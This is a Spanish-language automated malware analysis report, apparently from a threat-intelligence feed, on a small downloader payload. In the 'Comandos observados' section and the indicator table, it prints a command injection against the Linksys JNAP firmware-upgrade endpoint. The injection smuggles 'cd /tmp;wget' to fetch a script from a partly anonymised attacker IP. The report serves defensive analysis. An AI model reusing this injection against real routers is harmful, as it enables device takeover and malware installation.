# 🧬 Payload Analysis

`392f2c67bb4e1c951ee76d399b0699cb5da91887d4040aa252ad3659e414b200`

## 📌 Resumen

Texto ASCII de 444 B. La evidencia disponible identifica capacidad de descarga remota. Recurso remoto principal: `Upgrade` en `hxxp://linksys[.]com/jnap/firmware/Upgrade`. **Comandos observados o extraídos, en orden de aparición en la evidencia:**

1. `wget hxxp://91.92.40.XXX/w` Los comandos se presentan como evidencia observada o extraída; no se afirma ejecución salvo que la relación registrada sea `executed`. **Ficha malware:** [malware-like/oraculo/downloader/392f2c67bb4e1c951ee76d399b0699cb5da91887d4040aa252ad3659e414b200.md](../../../../../malware-like/oraculo/downloader/392f2c67bb4e1c951ee76d399b0699cb5da91887d4040aa252ad3659e414b200.md)


## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T19:42:54.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `392f2c67bb4e1c951ee76d399b0699cb5da91887d4040aa252ad3659e414b200`
- **MD5:** `9a14ec89eafad2cd8a2b8f981a6623a1`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with CRLF line terminators |
| Tamaño | 444 B |
| Entropía | 5.37 |
| Strings | 7 |

## 🧠 Comportamiento observado

1. **Descarga remota**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with CRLF line terminators; iocs=6

## 🖥️ Comandos observados / extraídos

```text
{"JNAP":{"action":"hxxp://linksys[.]com/jnap/firmware/Upgrade","command":"/tmp","url":"`cd /tmp;wget hxxp://91.92.40.XXX/w
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| url | hxxp://linksys[.]com/jnap/firmware/Upgrade | strings |
| url | hxxp://91.92.40.XXX/wget.sh | strings |
| ip | 91.92.40.XXX | static_analysis |
| ip | 190.179.175.XXX | static_analysis |
| command | {"JNAP":{"action":"hxxp://linksys[.]com/jnap/firmware/Upgrade","command":"/tmp","url":"`cd /tmp;wget hxxp://91.92.40.XXX/w | strings |
| hash | 392f2c67bb4e1c951ee76d399b0699cb5da91887d4040aa252ad3659e414b200 | static_analysis |
| ip | 45.156.87.XXX | artifact_source |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
